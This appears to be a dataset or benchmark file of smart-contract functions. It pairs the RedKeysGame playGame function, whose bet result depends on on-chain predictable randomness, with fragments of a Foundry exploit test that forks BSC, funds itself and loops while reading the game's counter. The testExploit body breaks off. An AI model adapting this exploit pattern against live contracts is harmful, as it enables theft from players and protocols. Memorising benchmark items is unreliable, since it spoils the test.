[
  {
    "contract/interface": "IRedKeysGame",
    "source_type": "victim_contract",
    "function_name": "counter",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "IRedKeysGame",
    "source_type": "victim_contract",
    "function_name": "playGame",
    "original_code": "    function playGame(\n        uint16 choice,\n        uint16 ratio,\n        uint256 amount\n    ) external nonReentrant {\n        // read once\n        uint16 benefit = ratios[ratio];\n\n        require(choice < 2, \"Wrong Choice\");\n        require(benefit > 0, \"Wrong Ratio\");\n        require(amount >= MIN_AMOUNT && amount <= MAX_AMOUNT, \"Not in Range\");\n\n        redKeysToken.transferFrom(msg.sender, address(this), amount);\n\n        counter++;\n        marketingFeeTotal += (amount * marketingFeeRatio) / DIVIDER;\n\n        uint16 _betResult = uint16(randomNumber()) % ratio;\n\n        bets[counter] = Bet(\n            counter,\n            amount,\n            block.timestamp,\n            msg.sender,\n            choice,\n            _betResult,\n            ratio,\n            benefit\n        );\n\n        if (choice == _betResult) {\n            uint256 earned = amount * benefit;\n            redKeysToken.transfer(msg.sender, earned);\n\n            // update states\n            earnings[msg.sender] += earned;\n            totalEarnings += earned;\n        } else {\n            redKeysToken.burn(amount / ratio);\n        }\n\n        usersLastGameId[msg.sender] = counter;\n        emit Game(counter);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        vm.createSelectFork(\"bsc\", blocknumToForkFrom);\n        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit\n        fundingToken = address(coin);\n\n        vm.label(address(game), \"RedKeysGame\");\n        vm.label(address(coin), \"REDKEYS\");\n\n        // prepare for exploit\n        deal(address(coin), address(this), 1e9);\n        coin.approve(address(game), type(uint256).max);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "RedKeysCoin",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() public balanceLog {\n        for (uint256 i = 0; i < 50; i++) {\n            // get current counter\n            uint256 counter = game.counter();\n\n",
    "description": ""
  }
]